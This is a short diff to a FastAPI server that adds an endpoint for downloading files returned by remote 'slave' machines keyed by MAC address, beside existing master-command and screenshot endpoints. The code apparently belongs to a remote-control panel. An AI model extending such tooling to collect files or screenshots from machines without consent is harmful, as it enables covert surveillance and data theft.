@@ -63,6 +63,18 @@ async def master_command(master_command: MasterCommandRequest):
 async def master_response(mac: str):
     return Service.get_response_from_slave_to_master(mac)
 
+
+@app.get("/api/master/slave/response/file/download")
+async def master_response_file_download(mac: str):
+    file_details = Service.get_response_from_slave_to_master(mac)
+
+    file_path = Service.get_file_download_path(mac,file_details['file'])
+    
+    if file_path is None:
+        raise HTTPException(status_code=404, detail="File not found!")
+    
+    return FileResponse(path=file_path, filename = file_details['file'])
+
 @app.get("/api/master/slave/response/screenshot")
 async def master_screenshot_response(mac: str):
     file_path = Service.get_screenshot_from_slave(mac)
